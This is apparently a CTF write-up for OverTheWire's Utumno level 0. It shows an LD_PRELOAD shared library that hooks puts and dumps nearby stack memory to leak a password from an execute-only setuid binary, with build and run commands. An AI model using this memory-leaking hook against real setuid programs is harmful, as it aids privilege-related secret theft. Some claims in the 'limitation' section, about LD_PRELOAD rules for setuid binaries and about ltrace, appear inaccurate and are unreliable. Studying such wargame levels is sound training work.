# Utumno Level 0 → 1

## Goal

The `utumno0` binary is marked `--x` — you can **execute** it but not **read** it, which means `gdb`, `objdump`, and `strings` all fail with "permission denied." The password is embedded in the binary's data segment, and your job is to pull it out *without* being able to read the file directly.

The classic trick here is **`LD_PRELOAD`**: slip your own shared library in front of libc so you intercept a function the target calls (like `puts`) and, from inside that hook, read memory the process has loaded into itself.

## Concepts you'll learn

- File permissions on binaries: what `--x` vs. `r-x` means for static analysis
- `LD_PRELOAD` — telling the dynamic linker "load this .so first, before any others"
- Using a hook on a common libc function (`puts`, `printf`, etc.) as a foothold inside the target process
- Dumping stack / known memory regions from inside a hook to find embedded strings

## Walkthrough

### 1. Log in and look at the binary

```bash
$ ssh utumno0@utumno.labs.overthewire.org -p 2227
```

Level-0 password: `utumno0`.

```bash
$ cd /utumno
$ ls -l utumno0
---s--x--- 1 utumno1 utumno0 ... utumno0
```

Execute bit set (with setuid), no read bit. `cat ./utumno0` fails. `gdb ./utumno0` fails. Run it:

```bash
$ ./utumno0
(some output)
```

It probably prints a line or two via `puts` and exits.

### 2. Build a library that hooks `puts`

Create a shared library that defines its own `puts`, which logs something and/or leaks memory before calling the real one:

```c
// /tmp/hook.c
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>

int puts(const char *s) {
    // Read a few bytes from the process's stack frame / known regions and print them.
    int (*real_puts)(const char*) = dlsym(RTLD_NEXT, "puts");

    // Leak pointer values in this frame — sometimes the password sits nearby.
    char *p;
    asm ("mov %%ebp, %0" : "=r" (p));
    for (int i = -200; i < 200; i++) {
        real_puts((char*)(p + i));
    }
    return real_puts(s);
}
```

Compile it (32-bit, to match the target):

```bash
$ gcc -m32 -shared -fPIC -o /tmp/hook.so /tmp/hook.c -ldl
```

### 3. Run the binary with LD_PRELOAD

```bash
$ LD_PRELOAD=/tmp/hook.so ./utumno0
```

When the target calls `puts`, your hook runs first, iterating through nearby memory and dumping strings. One of the dumped strings should look like a 10-character lowercase password — something like `utumno1` would reasonably name.

### 4. Simpler variation — a format-string leak

If the target's `puts` is actually `printf("%s", buf)`, your hook can `real_printf("%08x ", ...)` in a loop to walk the stack and print pointer values. Any pointer that looks like `0x0804....` is into the `.rodata` segment — dereference it to read the string:

```c
char *maybe = (char*)0x0804xxxx;
real_puts(maybe);
```

### 5. A limitation

Because `utumno0` is setuid, the dynamic linker **ignores `LD_PRELOAD`** for setuid binaries unless the user owns the library. You may need to either:

- Work against a non-setuid copy in a scratch folder (the binary you lack read permissions on, so this is hard), OR
- Combine `LD_PRELOAD` with an `ltrace` approach (which *does* work against setuid binaries via `ltrace -e puts`), OR
- Build a trampoline that execs the target in a way that forwards the memory dump

This is the hardest on-ramp in Utumno because it's more of a puzzle than a single exploitation technique. Expect to try several angles.

## The answer

The password for `utumno1` was redacted in the reference writeup, so no snapshot value is published here. Capture yours by running the solve to completion.

> ⚠️ OverTheWire may rotate passwords without notice. Even if a value were published here, it would be a snapshot — re-solve the level to get the current password.

## Reference

- Official level page: <https://overthewire.org/wargames/utumno/utumno0.html>
